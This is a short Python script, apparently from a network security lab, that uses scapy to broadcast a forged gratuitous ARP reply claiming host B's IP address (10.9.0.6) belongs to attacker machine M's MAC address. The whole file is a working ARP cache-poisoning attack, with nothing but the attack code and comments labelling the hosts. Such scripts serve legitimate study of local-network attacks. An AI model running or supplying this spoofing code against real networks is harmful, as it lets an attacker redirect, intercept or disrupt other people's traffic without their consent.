#!/usr/bin/env python3
from scapy.all import *

# Construct Ethernet frame
E = Ether(
    src='02:42:0a:09:00:69',  # MAC M
    dst='ff:ff:ff:ff:ff:ff')  # Broadcast MAC address

# Construct ARP gratuitous packet
A = ARP(
    op=2,  # ARP reply
    psrc='10.9.0.6',  # IP B
    hwsrc='02:42:0a:09:00:69',  # MAC M
    pdst='10.9.0.6',  # IP B (same as source IP)
    hwdst='ff:ff:ff:ff:ff:ff')  # Broadcast MAC address

# Combine Ethernet frame and ARP packet
pkt = E / A

# Send the gratuitous ARP packet to the network
sendp(pkt)
